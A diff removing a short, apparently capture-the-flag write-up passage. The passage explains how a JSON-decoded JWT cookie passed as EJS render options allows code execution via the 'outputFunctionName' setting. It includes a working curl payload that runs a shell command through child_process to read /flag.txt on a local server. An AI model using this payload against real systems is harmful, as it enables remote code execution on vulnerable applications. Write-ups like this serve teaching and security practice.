@@ -1,9 +1,0 @@
-<ul>
-<li>The jwt cookie is decoded using <code>JsonCookies</code> which allows for a json object to be created</li>
-<li>The decoded cookie is passed directly to the <code>app.render</code> function as the options</li>
-<li>this allows for the <code>view options</code> setting to be set and arbitrary javascript run with the <code>outputFunctionName</code> option:</li>
-</ul>
-
-<p><code>bash
-curl -g http://localhost:3000/ -H 'Cookie: jwt=j:{"settings":{"view options":{"outputFunctionName":"a%3b return global.process.mainModule.constructor._load(%27child_process%27).execSync(%27cat /flag.txt%27)%3b //"}}}
-</code></p>
